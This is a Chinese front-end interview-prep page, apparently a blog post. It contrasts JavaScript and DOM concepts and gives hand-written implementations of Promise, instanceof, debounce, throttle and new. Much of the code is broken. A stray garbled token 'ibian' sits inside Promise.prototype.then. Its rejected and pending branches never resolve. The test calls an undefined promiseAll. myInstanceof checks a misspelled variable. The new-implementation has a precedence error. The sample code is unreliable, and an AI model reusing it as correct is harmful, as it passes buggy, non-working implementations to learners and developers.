class="headerlink" title="document.ready 和 window.onload 的区别？"></a>document.ready 和 window.onload 的区别？</h2><p>页面加载完成有两种事件：</p><ul><li><p>ready 事件在 <strong>DOM 结构绘制完成</strong>之后执行，这样能确保就算有大量的媒体文件没加载，JS 代码一样可以执行。</p></li><li><p>load 事件必须等到<strong>网页中所有内容全部加载完毕</strong>之后执行。如果一个网页中有大量的图片的话，则就会出现网页文档已经呈现，但由于网页数据还没有加载完毕，导致 load 事件不能及时被触发的情况。</p></li></ul><h2 id="DOMContentLoaded-与-load-的区别"><a href="#DOMContentLoaded-与-load-的区别" class="headerlink" title="DOMContentLoaded 与 load 的区别 ?"></a>DOMContentLoaded 与 load 的区别 ?</h2><ul><li>DOMContentLoaded事件触发时：仅当DOM解析完成后，不包括样式表，图片等资源。</li><li>onload 事件触发时,页面上所有的 DOM,样式表,脚本,图片等资源已经加载完毕。</li></ul><h2 id="Js-动画与-CSS-动画区别及相应实现"><a href="#Js-动画与-CSS-动画区别及相应实现" class="headerlink" title="Js 动画与 CSS 动画区别及相应实现"></a>Js 动画与 CSS 动画区别及相应实现</h2><p>CSS3 的动画的<strong>优点</strong>：在性能上会稍微好一些，浏览器会对 CSS3 的动画做一些优化。代码相对简单。</p><p><strong>缺点</strong>：在动画控制上不够灵活。兼容性不好。</p><p>JavaScript 的动画<strong>优点</strong>：控制能力很强，可以单帧的控制、变换，同时写得好完全可以兼容 IE6，并且功能强大。</p><p>对于一些复杂控制的动画，使用 javascript 会比较靠谱。而在实现一些小的交互动效的时候，就多考虑考虑 CSS 吧。</p><h2 id="Object-is-与比较操作符-“-”、“-”-的区别？"><a href="#Object-is-与比较操作符-“-”、“-”-的区别？" class="headerlink" title="Object.is() 与比较操作符 “===”、“==” 的区别？"></a>Object.is() 与比较操作符 “===”、“==” 的区别？</h2><p>两等号判等，会在比较时进行类型转换。</p><p>三等号判等（判断严格），比较时不进行隐式类型转换。</p><p>Object.is(NaN, NaN) 返回 true，Object.is(-0，+0)返回 false。应被认为有其特殊的用途，而不能用它对比宽松或严格。</p><h2 id="同步和异步的区别？"><a href="#同步和异步的区别？" class="headerlink" title="同步和异步的区别？"></a>同步和异步的区别？</h2><p>同步：执行完函数或方法后，一直等待系统返回值或消息。这时程序阻塞，只有接收到返回的值或消息后才往下执行其他的命令。  </p><p>异步：执行完函数或方法后，不必阻塞性地等待返回值或消息，只需要向系统委托一个异步过程，那么当系统接收到返回值或消息时，系统会自动触发委托的异步过程，从而完成一个完整的流程。 </p><h2 id="parseInt-和-Number-的区别？"><a href="#parseInt-和-Number-的区别？" class="headerlink" title="*parseInt() 和 Number() 的区别？"></a>*parseInt() 和 Number() 的区别？</h2><p>①允许字符串含有非数字字符，解析按从左到右的顺序，如果遇到非数字字符就<strong>停止</strong>。</p><p>②不允许出现非数字字符，否则会<strong>失败</strong>并返回 NaN。</p><h2 id="和-的-valueOf-和-toString-的结果？"><a href="#和-的-valueOf-和-toString-的结果？" class="headerlink" title="*{} 和 [] 的 valueOf 和 toString 的结果？"></a>*{} 和 [] 的 valueOf 和 toString 的结果？</h2><p>valueOf : 返回对象的<strong>原始值</strong>表示。</p><p>toString : 返回对象的<strong>字符串</strong>表示。</p><p>{} 的 valueOf 结果为 {} ，toString 的结果为 “[object Object]”</p><p>[] 的 valueOf 结果为 [] ，toString 的结果为 “”</p><h2 id="isNaN-和-Number-isNaN-函数的区别？"><a href="#isNaN-和-Number-isNaN-函数的区别？" class="headerlink" title="*isNaN 和 Number.isNaN 函数的区别？"></a>*isNaN 和 Number.isNaN 函数的区别？</h2><ul><li><p>isNaN 接收参数后，会尝试将这个参数转换为数值，任何不能被转换为数值的的值都会返回 true，因此<strong>非数字值传入也会返回 true</strong> ，会影响 NaN 的判断。</p></li><li><p>Number.isNaN 会<strong>首先判断传入参数是否为数字</strong>，如果是数字再继续判断是否为 NaN ，这种方法对于 NaN 的判断更为准确。</p></li></ul><h2 id="innerHTML-与-outerHTML-的区别？"><a href="#innerHTML-与-outerHTML-的区别？" class="headerlink" title="*innerHTML 与 outerHTML 的区别？"></a>*innerHTML 与 outerHTML 的区别？</h2><p>对于这样一个 HTML 元素：<code>&lt;div&gt;content&lt;br/&gt;&lt;/div&gt;</code>。</p><p>innerHTML：内部 HTML，<code>content&lt;br/&gt;</code>；<br>outerHTML：外部 HTML，<code>&lt;div&gt;content&lt;br/&gt;&lt;/div&gt;</code>；<br>innerText：内部文本，<code>content</code> ；<br>outerText：内部文本，<code>content</code> ；</p><h2 id="documen-write-和-innerHTML-的区别？"><a href="#documen-write-和-innerHTML-的区别？" class="headerlink" title="*documen.write 和 innerHTML 的区别？"></a>*documen.write 和 innerHTML 的区别？</h2><ul><li><p>document.write 的内容会代替整个文档内容，会重写整个页面。</p></li><li><p>innerHTML 的内容只是替代指定元素的内容，只会重写页面中的部分内容。</p></li></ul><h2 id="Math-ceil-和-Math-floor-区别"><a href="#Math-ceil-和-Math-floor-区别" class="headerlink" title="*Math.ceil 和 Math.floor 区别"></a>*Math.ceil 和 Math.floor 区别</h2><p>Math.ceil() === 向上取整，函数返回一个大于或等于给定数字的最小整数。</p><p>Math.floor() === 向下取整，函数返回一个小于或等于给定数字的最大整数。</p><h2 id="toPrecision-和-toFixed-和-Math-round-的区别？"><a href="#toPrecision-和-toFixed-和-Math-round-的区别？" class="headerlink" title="*toPrecision 和 toFixed 和 Math.round 的区别？"></a>*toPrecision 和 toFixed 和 Math.round 的区别？</h2><p>toPrecision 用于处理精度，精度是从左至右第一个不为 0 的数开始数起。<br>toFixed 是对小数点后指定位数取整，从小数点开始数起。<br>Math.round 是将一个数字四舍五入到一个整数。</p><h2 id="URL-和-URI-的区别？"><a href="#URL-和-URI-的区别？" class="headerlink" title="*URL 和 URI 的区别？"></a>*URL 和 URI 的区别？</h2><p><strong>URI</strong>: Uniform Resource Identifier      <strong>统一资源标识符</strong>，用唯一的标识来确定一个资源，它是一种抽象的定义，也就是说不管使用什么方法来定义，只要能唯一的标识一个资源，就可以称为 URI。<br><strong>URL</strong>: Uniform Resource Location        <strong>统一资源定位符</strong>，URL 和 URN 是 URI 的子集，URL 可以理解为使用地址来标识资源。<br><strong>URN</strong>: Universal Resource Name          <strong>统一资源名称</strong>，URN 可以理解为使用名称来标识资源。</p><h2 id="src-和-href-的区别"><a href="#src-和-href-的区别" class="headerlink" title="*src 和 href 的区别"></a>*src 和 href 的区别</h2><p>href 表示超文本引用，在 link 和 a 等元素上使用。指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的连接，用于超链接。</p><p>src 表示来源地址，在 img、script、iframe 等元素（可替换的元素）上。指向外部资源的位置，指向的内容将会嵌入到文档中当前标签的所在位置，在请求src资源时会将其指向的资源下载并应用到文档內。</p><p><strong>src 的内容，是页面必不可少的一部分，是引入。href 的内容，是与该页面有关联，是引用。</strong></p><h2 id="mouseover-和-mouseenter-的区别？"><a href="#mouseover-和-mouseenter-的区别？" class="headerlink" title="*mouseover 和 mouseenter 的区别？"></a>*mouseover 和 mouseenter 的区别？</h2><p>当鼠标移动到元素上时就会触发 mouseenter 事件，类似 mouseover，它们两者之间的差别是 <strong>mouseenter 不会冒泡</strong>。</p><p>由于 mouseenter 不支持事件冒泡，导致在一个元素的子元素上进入或离开的时候会触发其 mouseover 和 mouseout 事件，但是却不会触发 mouseenter 和 mouseleave 事件。</p><h2 id="offsetWidth-offsetHeight，clientWidth-clientHeight-与-scrollWidth-scrollHeight-的区别？"><a href="#offsetWidth-offsetHeight，clientWidth-clientHeight-与-scrollWidth-scrollHeight-的区别？" class="headerlink" title="*offsetWidth/offsetHeight，clientWidth/clientHeight 与 scrollWidth/scrollHeight 的区别？"></a>*offsetWidth/offsetHeight，clientWidth/clientHeight 与 scrollWidth/scrollHeight 的区别？</h2><p>clientWidth/clientHeight 返回的是元素的内部宽度，它的值只包含 content + padding，如果有滚动条，不包含滚动条。<br>clientTop 返回上边框的宽度。<br>clientLeft 返回左边框的宽度。</p><p>offsetWidth/offsetHeight 返回的是元素的布局宽度，它的值包含 content + padding + border 包含了滚动条。<br>offsetTop 返回当前元素相对于其 offsetParent 元素的顶部距离。<br>offsetLeft 返回当前元素相对于其 offsetParent 元素的左部距离。</p><p>scrollWidth/scrollHeight 返回值包含 content + padding + 溢出内容的尺寸。<br>scrollTop 属性返回一个元素内容垂直滚动的像素数。<br>scrollLeft 属性返回元素滚动条到元素左边的距离。</p><h2 id="escape，encodeURI，encodeURIComponent-有什么区别？"><a href="#escape，encodeURI，encodeURIComponent-有什么区别？" class="headerlink" title="*escape，encodeURI，encodeURIComponent 有什么区别？"></a>*escape，encodeURI，encodeURIComponent 有什么区别？</h2><p>encodeURI 是对整个 URI 进行转义，将 URI 中的非法字符转换为合法字符，所以对于一些在 URI 中有特殊意义的字符不会进行转义。</p><p>encodeURIComponent 是对 URI 的组成部分进行转义，所以一些特殊字符也会得到转义。</p><p>escape 和 encodeURI 的作用相同，不过它们对于 unicode 编码为 0xff 之外字符的时候会有区别，escape 是直接在字符的 unicode 编码前加上 %u，而 encodeURI 首先会将字符转换为 UTF-8 的格式，再在每个字节前加上 %。</p><h1 id="JavaScript-实现"><a href="#JavaScript-实现" class="headerlink" title="JavaScript 实现"></a>JavaScript 实现</h1><h2 id="手写-Promise（高频，尤其是all）"><a href="#手写-Promise（高频，尤其是all）" class="headerlink" title="手写 Promise（高频，尤其是all）"></a>手写 Promise（高频，尤其是all）</h2><p><strong>从头到尾多写几次！！！</strong></p><p>参考了**<a href="https://link.zhihu.com/?target=https://github.com/xieranmaya/blog/issues/3">剖析 Promise 内部结构，一步一步实现一个完整的、能通过所有 Test case 的 Promise 类</a>**，其中<code>不同Promise的交互</code>问题仍为解决，有待后续补充。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Promise</span>(<span class="params">executor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="built_in">this</span>;</span><br><span class="line">  self.status = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">  self.data = <span class="literal">undefined</span>;</span><br><span class="line">  self.onResolvedCallback = [];</span><br><span class="line">  self.onRejectedCallback = [];</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">resolve</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value <span class="keyword">instanceof</span> <span class="built_in">Promise</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> value.then(resolve, reject)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 异步执行所有的回调函数</span></span><br><span class="line">      <span class="keyword">if</span> (self.status === <span class="string">&#x27;pending&#x27;</span>) &#123;</span><br><span class="line">        self.status = <span class="string">&#x27;resolved&#x27;</span></span><br><span class="line">        self.data = value</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; self.onResolvedCallback.length; i++) &#123;</span><br><span class="line">          self.onResolvedCallback[i](value)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">reject</span>(<span class="params">reason</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 异步执行所有的回调函数</span></span><br><span class="line">      <span class="keyword">if</span> (self.status === <span class="string">&#x27;pending&#x27;</span>) &#123;</span><br><span class="line">        self.status = <span class="string">&#x27;rejected&#x27;</span></span><br><span class="line">        self.data = reason</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; self.onRejectedCallback.length; i++) &#123;</span><br><span class="line">          self.onRejectedCallback[i](reason)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    executor(resolve, reject);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    reject(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.prototype.then = <span class="function"><span class="keyword">function</span> (<span class="params">onResolved, onRejected</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="built_in">this</span>;</span><br><span class="line">  <span class="keyword">var</span> promise2;</span><br><span class="line">  onResolved = <span class="keyword">typeof</span> onResolved === <span class="string">&#x27;function&#x27;</span> ? onResolved : <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123; <span class="keyword">return</span> value &#125;;</span><br><span class="line">  onRejected = <span class="keyword">typeof</span> onRejected === <span class="string">&#x27;function&#x27;</span> ? onRejected : <span class="function"><span class="keyword">function</span> (<span class="params">reason</span>) </span>&#123; <span class="keyword">return</span> reason &#125;;</span><br><span class="line">  <span class="keyword">if</span> (self.status === <span class="string">&#x27;resolved&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> promise2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">// 异步执行onResolved</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> x = onResolved(self.data);</span><br><span class="line">          <span class="keyword">if</span> (x <span class="keyword">instanceof</span> <span class="built_in">Promise</span>) &#123;</span><br><span class="line">            x.then(resolve, reject);</span><br><span class="line">          &#125; ibian</span><br><span class="line">          resolve(x)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">          reject(e)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">     &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (self.status === <span class="string">&#x27;rejected&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> promise2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 异步执行onRejected</span></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> x = onRejected(self.data);</span><br><span class="line">        <span class="keyword">if</span> (x <span class="keyword">instanceof</span> <span class="built_in">Promise</span>) &#123;</span><br><span class="line">          x.then(resolve,reject)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        reject(e)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (self.status === <span class="string">&#x27;pending&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> promise2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">      self.onResolvedCallback.push(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> x = onResolved(self.data)</span><br><span class="line">          <span class="keyword">if</span> (x <span class="keyword">instanceof</span> <span class="built_in">Promise</span>) &#123;</span><br><span class="line">            x.then(resolve, reject)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// resolve(x)</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">          reject(e)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      self.onRejectedCallback.push(<span class="function"><span class="keyword">function</span>(<span class="params">reason</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> x = onRejected(self.data)</span><br><span class="line">          <span class="keyword">if</span> (x <span class="keyword">instanceof</span> <span class="built_in">Promise</span>) &#123;</span><br><span class="line">            x.then(resolve, reject)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">          reject(e)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 catch</span></span><br><span class="line"><span class="built_in">Promise</span>.prototype.catch = <span class="function"><span class="keyword">function</span> (<span class="params">onRejected</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.then(<span class="literal">null</span>, onRejected);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 finally</span></span><br><span class="line"><span class="built_in">Promise</span>.prototype.finally = <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 这里所有的then调用是一起的，但是这个then里调用fn又异步了一次，所以它总是最后调用的。</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(fn)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">reason</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(fn)</span><br><span class="line">    <span class="keyword">throw</span> reason</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 all</span></span><br><span class="line"><span class="built_in">Promise</span>.myall = <span class="function"><span class="keyword">function</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr.length === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> resolve([])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> res = [], count = <span class="number">0</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 同时也能处理arr数组中非Promise对象</span></span><br><span class="line">        <span class="keyword">if</span> (!(arr[i] <span class="keyword">instanceof</span> <span class="built_in">Promise</span>)) &#123;</span><br><span class="line">          res[i] = arr[i]</span><br><span class="line">          <span class="keyword">if</span> (++count === arr.length)</span><br><span class="line">            resolve(res)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          arr[i].then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">            res[i] = value</span><br><span class="line">            <span class="keyword">if</span> (++count === arr.length)</span><br><span class="line">              resolve(res)</span><br><span class="line">          &#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">              reject(err)</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        resolve(<span class="number">1</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        resolve(<span class="number">2</span>)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">let</span> p3 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        resolve(<span class="number">3</span>)</span><br><span class="line">    &#125;, <span class="number">3000</span>)</span><br><span class="line">&#125;)</span><br><span class="line">promiseAll([p3, p1, p2]).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res) <span class="comment">// [3, 1, 2]</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现 race</span></span><br><span class="line"><span class="built_in">Promise</span>.myrace = <span class="function"><span class="keyword">function</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!(arr[i] <span class="keyword">instanceof</span> <span class="built_in">Promise</span>)) &#123;</span><br><span class="line">        <span class="built_in">Promise</span>.resolve(arr[i]).then(resolve, reject)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        arr[i].then(resolve, reject)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://juejin.cn/post/6844903625769091079">https://juejin.cn/post/6844903625769091079</a>: 见promise.js</p><h2 id="实现-instanceof-（高频）"><a href="#实现-instanceof-（高频）" class="headerlink" title="实现 instanceof （高频）"></a>实现 instanceof （高频）</h2><p>instanceof 运算符用于判断构造函数的 <code>prototype</code> 属性是否出现在对象的原型链 <code>__proto__</code> 中的任何位置。可参考<a href="https://juejin.cn/post/6844903613584654344">浅谈 instanceof 和 typeof 的实现原理</a>。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myInstanceof</span>(<span class="params">leftValue, rightValue</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// leftValue对象，rightValue构造函数</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> leftVaule !== <span class="string">&#x27;object&#x27;</span> || leftVaule === <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">let</span> leftproto = <span class="built_in">Object</span>.getPrototypeOf(leftValue) <span class="comment">// 获取左边对象的原型。getPrototypeOf 方法返回指定对象的原型，等同于 __proto__</span></span><br><span class="line">  <span class="keyword">let</span> prototype = rightValue.prototype; <span class="comment">// 获取右边构造函数的 prototype 对象</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 判断构造函数的 prototype 对象是否在对象的原型链上</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="comment">// 若 leftproto === null 退出查找</span></span><br><span class="line">    <span class="keyword">if</span> (!leftproto) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (leftproto === prototype) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    leftproto = <span class="built_in">Object</span>.getPrototypeOf(leftproto);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造函数、原型、原型链之间的关系如下图：<img src="https://i.loli.net/2021/07/21/kfuqgFARIGJnPjM.jpg" alt="Snipaste_2021-07-21_11-00-06.jpg"></p><h2 id="实现防抖与节流（高频）"><a href="#实现防抖与节流（高频）" class="headerlink" title="实现防抖与节流（高频）"></a>实现防抖与节流（高频）</h2><p>防抖：完整版可以参考<a href="https://github.com/mqyqingfeng/Blog/issues/22">JavaScript专题之跟着underscore学防抖</a>。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数防抖的实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">fn, delay</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> timer = <span class="literal">null</span>;</span><br><span class="line">  <span class="comment">// 返回的是一个函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 防止 this 指向、事件对象 event 改变</span></span><br><span class="line">    <span class="keyword">var</span> context = <span class="built_in">this</span>, args = <span class="built_in">arguments</span>;</span><br><span class="line">    <span class="comment">// 如果此时存在定时器的话，则取消之前的定时器重新记时</span></span><br><span class="line">    <span class="keyword">if</span> (timer) &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(timer);</span><br><span class="line">      timer = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置定时器，使事件间隔指定事件后执行</span></span><br><span class="line">    timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      fn.apply(context, args);</span><br><span class="line">    &#125;, delay);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>节流：完整版可以参考<a href="https://github.com/mqyqingfeng/Blog/issues/26">JavaScript专题之跟着underscore学节流</a>。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数节流的实现一（时间戳）;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">fn, delay</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> preTime = <span class="built_in">Date</span>.now();</span><br><span class="line">  <span class="keyword">let</span> context = <span class="built_in">this</span>;</span><br><span class="line">  <span class="keyword">let</span> args = <span class="built_in">arguments</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> nowTime = <span class="built_in">Date</span>.now();</span><br><span class="line">    <span class="comment">// 如果两次时间间隔超过了指定时间，则执行函数。</span></span><br><span class="line">    <span class="keyword">if</span> (nowTime - preTime &gt;= delay) &#123;</span><br><span class="line">      fn.apply(context, args);</span><br><span class="line">      preTime = <span class="built_in">Date</span>.now();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数节流的实现二（定时器）;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">fn, delay</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> valid = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> context = <span class="built_in">this</span>;</span><br><span class="line">    <span class="keyword">let</span> args = <span class="built_in">arguments</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!valid) <span class="keyword">return</span>;</span><br><span class="line">        valid = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            fn.apply(context, args);</span><br><span class="line">            valid = <span class="literal">true</span>;</span><br><span class="line">        &#125;, delay);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现-new（高频）"><a href="#实现-new（高频）" class="headerlink" title="实现 new（高频）"></a>实现 new（高频）</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objectFactory</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> obj = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line">  <span class="comment">// Constructor 是 arguments 中第一个元素, args 为剩余值 Constructor =&gt; [Function: fn]</span></span><br><span class="line">  <span class="keyword">let</span> [Constructor, ...args] = [...arguments];</span><br><span class="line">  <span class="comment">// 将 obj 的原型指向函数的 prototype 对象, 这样 obj 就可以访问到构造函数原型中的属性</span></span><br><span class="line">  obj.__proto__ = Constructor.prototype;</span><br><span class="line">  <span class="comment">// 使用 apply, 改变构造函数 this 指向到新建的对象, 这样 obj 就可以访问到构造函数中的属性</span></span><br><span class="line">  <span class="keyword">let</span> result = Constructor.apply(obj, args);</span><br><span class="line">  <span class="comment">// 判断函数的返回值类型,如果是引用类型, 就返回这个引用类型的对象。</span></span><br><span class="line">  <span class="keyword">if</span> (result &amp;&amp; <span class="keyword">typeof</span> result === <span class="string">&#x27;function&#x27;</span> || <span class="keyword">typeof</span> result === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果是值类型, 